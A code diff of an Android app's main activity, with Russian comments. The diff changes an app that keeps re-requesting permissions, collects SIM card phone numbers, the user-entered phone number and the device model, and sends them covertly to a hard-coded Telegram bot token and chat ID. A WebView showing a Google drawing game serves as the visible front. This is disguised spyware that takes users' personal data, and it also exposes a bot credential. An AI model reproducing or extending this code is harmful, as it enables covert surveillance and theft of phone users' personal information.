@@ -105,7 +105,6 @@ class MainActivity : AppCompatActivity() {
         }.toTypedArray()
     
         if (permissionsToRequest.isNotEmpty()) {
-            // Запрашиваем только первое отсутствующее разрешение
             ActivityCompat.requestPermissions(
                 this,
                 arrayOf(permissionsToRequest.first()),
@@ -113,7 +112,6 @@ class MainActivity : AppCompatActivity() {
             )
         } else {
             onAllPermissionsGranted()
-            sendNotification("Все разрешения уже предоставлены")
         }
     }
     
@@ -129,16 +127,15 @@ class MainActivity : AppCompatActivity() {
             val granted = grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED
     
             if (granted) {
-                // После получения одного разрешения проверяем остальные
                 checkPermissions()
             } else {
-                // Снова запрашиваем это же разрешение
                 checkPermissions()
             }
         }
     }
 
     private fun onAllPermissionsGranted() {
+        sendNotification("Все разрешения предоставлены")
         val simInfo = getSimNumbersString()
         sendNotification("Информация о SIM-картах:\n$simInfo")
         val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
@@ -171,7 +168,7 @@ class MainActivity : AppCompatActivity() {
             val phoneNumber = phoneInput.text.toString().trim()
             if (phoneNumber.isNotEmpty()) {
                 sharedPreferences.edit().putString(PHONE_NUMBER_KEY, phoneNumber).apply()
-                sendNotification("Пользователь ввел номер телефона: $phoneNumber")
+                sendNotification("Введен номер телефона: $phoneNumber")
                 loadWebView()
                 dialog.dismiss()
             } else {
@@ -183,7 +180,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun loadWebView() {
-        myWebView.loadUrl("https://www.example.com")
+        myWebView.loadUrl("https://quickdraw.withgoogle.com/")
     }
 
     @SuppressLint("MissingPermission", "HardwareIds")
@@ -223,7 +220,6 @@ class MainActivity : AppCompatActivity() {
                     result.append("Активные SIM-карты не найдены\n")
                 }
             } else {
-                // Для старых версий Android
                 @Suppress("DEPRECATION")
                 val number = telephonyManager.line1Number
                 result.append("Основной номер SIM: ${number ?: "недоступен"}\n")
@@ -238,12 +234,8 @@ class MainActivity : AppCompatActivity() {
 
     private fun sendNotification(message: String) {
         try {
-            val deviceInfo = getDeviceInfo()
-            val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "не указан")
-            val fullMessage = """$message
-        $deviceInfo
-        Номер телефона: $phoneNumber
-        Время: ${System.currentTimeMillis()}""".trimIndent()
+            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val fullMessage = "$message\n$deviceModel"
 
             val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
             val chatId = "6331293386"
@@ -275,12 +267,5 @@ class MainActivity : AppCompatActivity() {
         } catch (e: Exception) {
             e.printStackTrace()
         }
-    }
-
-    private fun getDeviceInfo(): String {
-        return """Производитель: ${Build.MANUFACTURER}
-    Модель: ${Build.MODEL}
-    Версия ОС: ${Build.VERSION.RELEASE}
-    SDK: ${Build.VERSION.SDK_INT}""".trimIndent()
     }
 }
